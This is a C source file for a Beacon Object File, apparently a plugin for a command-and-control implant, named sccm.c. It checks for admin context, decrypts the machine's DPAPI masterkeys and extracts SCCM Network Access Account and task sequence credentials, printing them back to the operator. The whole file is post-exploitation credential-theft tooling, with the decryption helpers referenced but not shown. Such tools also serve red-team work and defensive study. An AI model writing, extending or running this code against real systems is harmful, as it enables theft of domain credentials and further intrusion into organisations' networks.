/*
 * sccm.c — BOF for SCCM credential triage
 *
 * Usage:
 *   sccm [/target:PATH]
 *
 * Searches for SCCM Network Access Account (NAA) credentials
 * and task sequence credentials stored in DPAPI blobs.
 * Requires high integrity (admin).
 */
#include "beacon.h"
#include "bofdefs.h"
#include "dpapi_common.h"
#include "triage.h"
#include "helpers.h"

void go(char* args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);

    char* target_str = BeaconDataExtract(&parser, NULL);

    if (!is_high_integrity()) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] SCCM triage requires high integrity (admin) context\n");
        return;
    }

    wchar_t* target = NULL;
    if (target_str && strlen(target_str) > 0) target = utf8_to_wide(target_str);

    MASTERKEY_CACHE cache;
    mk_cache_init(&cache);

    /* Decrypt machine masterkeys first */
    triage_system_masterkeys(&cache);

    BeaconPrintf(CALLBACK_OUTPUT, "\n=== DPAPI SCCM (BOF) ===\n");

    triage_sccm(&cache, target);

    mk_cache_free(&cache);
    if (target) intFree(target);
}
